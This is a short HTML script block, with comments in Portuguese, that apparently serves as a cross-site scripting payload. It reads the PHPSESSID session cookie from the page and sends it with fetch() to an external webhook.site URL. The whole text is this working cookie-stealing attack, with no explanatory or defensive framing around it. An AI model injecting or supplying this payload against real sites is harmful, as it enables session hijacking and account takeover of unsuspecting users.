<script>
    // Obter o valor do cookie
    var cookieValue = document.cookie
        .split('; ')
        .find(row => row.startsWith('PHPSESSID='))
        .split('=')[1];
    
    // Definir o URL do webhook
    var webhookUrl = 'https://webhook.site/2dfcc623-5c60-4ed9-84c7-f2efae2af582';

    // Enviar o valor do cookie para o webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cookie: cookieValue }),
    });
</script>
